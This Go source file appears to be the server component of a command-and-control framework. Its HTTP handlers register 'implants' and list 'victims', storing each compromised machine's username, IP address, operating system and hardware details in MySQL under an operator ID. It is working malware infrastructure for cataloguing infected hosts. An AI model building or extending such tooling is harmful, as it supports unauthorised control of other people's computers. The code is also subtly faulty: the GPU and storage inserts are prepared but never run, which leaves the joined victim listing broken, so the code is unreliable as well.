package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
)

// Define a structure above to handle JSON request/responses to list the victims that have connected to the database.
type ListDevices struct {
	Username        string `json:"Victim.username"`
	Network         string `json:"Network.ip_address"`
	OperatingSystem string `json:"Operating_System.name"`
	CPU             string `json:"CPU.architecture"`
	GPU             string `json:"GPU.information"`
	RAM             string `json:"RAM.amount"`
	Storage         string `json:"Storage.amount"`
}

// Define a Method for the Operator to see the list of implants connected
func getClients(w http.ResponseWriter, r *http.Request) {
	// Define query string to perform on the database
	sqlQuery := "SELECT Victim.username, Network.ip_address, Operating_System.name, CPU.architecture, GPU.information, RAM.amount, Storage.amount " + "FROM Victim " + "JOIN Network ON Victim.id = Network.victim_id " + "JOIN Operating_System ON Victim.id = Operating_System.victim_id " + "JOIN CPU ON Victim.id = CPU.victim_id " + "JOIN GPU ON Victim.id = GPU.victim_id " + "JOIN RAM ON Victim.id = RAM.victim_id " + "JOIN Storage ON Victim.id = Storage.victim_id"

	// Perform query using the db open connection to MySQL
	results, err := db.Query(sqlQuery)
	if err != nil {
		log.Fatal(err)
	}

	defer results.Close()

	var listDevices []ListDevices

	// For earch result in the result set of the query, append them into the ListDevices structure
	for results.Next() {
		var ld ListDevices
		err = results.Scan(&ld.Username, &ld.Network, &ld.OperatingSystem, &ld.CPU, &ld.GPU, &ld.RAM, &ld.Storage)
		if err != nil {
			panic(err.Error())
		}
		listDevices = append(listDevices, ld)
	}

	// Now that we have the list of victims in listDevices, marshal the structure to JSON
	jsonData, err := json.Marshal(listDevices)
	if err != nil {
		panic(err.Error())
	}

	// Send the response which will contain the JSON for all the victims connected as an item list
	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)

	fmt.Println(string(jsonData))

	// Close the DB connection
	defer results.Close()

	fmt.Println("Success!")
}

// Much like List Devices struct, we define one more complete to register victims
type Device struct {
	ID              string `json:"ID"`
	DeviceName      string `json:"DeviceName"`
	Username        string `json:"Username"`
	OperatorID      int    `json:"OperatorID"`
	CPUArchitecture string `json:"CPUArchitecture"`
	GPUInfo         string `json:"GPUInfo"`
	RAMInfo         int    `json:"RAMInfo"`
	OSName          string `json:"OSName"`
	NetworkInfo     string `json:"NetworkInfo"`
	CurrentDate     string `json:"CurrentDate"`
}

// On hit, take the request and perform actions to then register it to the databas
func registerNewImplant(w http.ResponseWriter, r *http.Request) {

	// First, we receive the response which will be JSON data, unmarshall it and put it in the Device struct
	defer r.Body.Close()
	var device Device
	decoder := json.NewDecoder(r.Body)
	err := decoder.Decode(&device)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	fmt.Printf("Registering a new implant %s\n\n", device.DeviceName)

	// After the data is ready, we set a list of prepared statements in order to insert the data from the JSON request into the database
	stmt, err := db.Prepare("INSERT INTO Victim (username, operator_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	res, err := stmt.Exec(device.Username, device.OperatorID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	victimID, err := res.LastInsertId()
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO CPU (architecture, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.CPUArchitecture, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO GPU (information, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	stmt, err = db.Prepare("INSERT INTO RAM (amount, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.RAMInfo, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Storage (amount, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	stmt, err = db.Prepare("INSERT INTO Operating_System (name, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.OSName, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Network (ip_address, mac_address, victim_id) VALUES (?, ?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.NetworkInfo, "", victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	// After all items are registered, we response with a success message
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("New implant registered successfully"))
}
